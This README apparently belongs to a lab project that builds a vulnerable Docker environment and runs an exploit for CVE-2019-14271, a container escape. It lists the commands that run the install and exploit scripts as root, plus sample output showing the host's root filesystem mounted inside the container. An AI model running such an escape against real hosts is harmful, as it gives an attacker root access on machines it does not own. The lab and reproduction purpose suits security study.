# CVE-2019-14271_Exploit
A convenient and time-saving auto script of building environment and exploit it.

# References
https://github.com/Metarget/metarget

https://github.com/Metarget/metarget/tree/master/writeups_cnv/docker-cve-2019-14271

https://github.com/thomasyang1207/Exploits/tree/master/CVE_2019_14271

# Usage
```bash
chmod 777 Exploit.sh
chmod 777 Install_env.sh
sudo ./Install_env.sh
sudo ./Exploit.sh
```
> If the image has been built, run `Exploit.sh` only for reuse.

Now you have entered the container `cve-14271` and see:
```bash
root@d9b5a334a0e9:/# ls
bin         breakout  home     lib32   logs   opt   run   sys  var
boot        dev       host_fs  lib64   media  proc  sbin  tmp
break_logs  etc       lib      libx32  mnt    root  srv   usr
```

Enter `host_fs` and you will find the host's root directory has been mounted here and you escape successfully. You can act as a root user in the host machine.
